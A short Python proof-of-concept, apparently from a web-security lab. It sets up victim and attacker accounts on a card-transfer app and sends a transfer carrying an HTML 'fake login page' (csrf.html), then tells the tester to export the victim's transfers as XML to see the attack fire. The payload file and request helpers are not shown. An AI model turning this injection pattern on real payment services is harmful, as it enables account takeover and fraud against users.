#! /usr/bin/env python3

from const import *

# Fake login page for demonstration.
page = open("./csrf.html", "r").read()

victim = User("victim8", "12345678")
attacker = User("attacker8", "12345678")

# The transfer flow is attacker -> victim.
dst = victim.cardregister()["card_number"]
src = attacker.cardregister()["card_number"]

# Execute the attack.
attacker.transfer(src, dst, "1", page)

print("""
Now open a browser, log in as {}, password {},
go to {}/card2card/export, export as XML and
enter something on the form to check out the
attack.
""".format(victim.name, victim.pwd, url))